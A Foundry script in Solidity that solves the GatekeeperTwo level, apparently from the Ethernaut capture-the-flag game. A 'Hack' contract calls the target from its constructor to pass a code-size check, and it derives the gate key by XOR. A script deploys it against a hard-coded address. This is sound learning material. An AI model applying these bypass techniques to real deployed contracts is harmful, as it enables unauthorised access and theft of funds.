// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/14-GateKeeperTwo.sol";

contract Hack {
    constructor(GatekeeperTwo _target) {
        // Bitwise xor
        // a     = 1010
        // b     = 0110
        // a ^ b = 1100

        // a ^ a ^ b = b

        // a     = 1010
        // a     = 1010
        // a ^ a = 0000

        // max = 11...11
        // s ^ key = max
        // s ^ s ^ key = s ^ max 
        //         key = s ^ max 
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = type(uint64).max ^ s;
        bytes8 key = bytes8(k);
        require(_target.enter(key), "failed");
    }
}


contract GateKeeperTwoSolution is Script {
    GatekeeperTwo gateKeeperInstance = GatekeeperTwo(0xba81a31Daf00Ffc1E91693f0632Bf4409F36799F);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("entrant:", gateKeeperInstance.entrant());
        Hack hack = new Hack(gateKeeperInstance);
        console.log("entrant after hack:", gateKeeperInstance.entrant());
        vm.stopBroadcast();
    }
}